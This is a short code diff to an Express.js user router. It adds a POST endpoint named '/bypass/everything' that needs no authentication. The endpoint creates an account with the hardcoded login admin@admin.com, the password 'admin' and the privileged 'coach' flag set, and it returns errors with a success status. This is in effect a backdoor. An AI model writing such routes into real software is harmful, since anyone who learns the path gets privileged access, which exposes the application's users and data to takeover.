@@ -127,4 +127,23 @@ router.patch("/password", isOwerUser, (req, res) => {
         });
 });
 
+router.post("/bypass/everything", (req, res) => {
+    console.log(req.body);
+    User.create({
+        name: {
+            firstName: "admin",
+            lastName: "Val",
+        },
+        email: "admin@admin.com",
+        password: bcrypt.hashSync("admin", 10),
+        coach: true,
+    })
+        .then(user => {
+            res.status(200).send(user);
+        })
+        .catch(err => {
+            res.status(200).send(err);
+        });
+});
+
 module.exports = router;
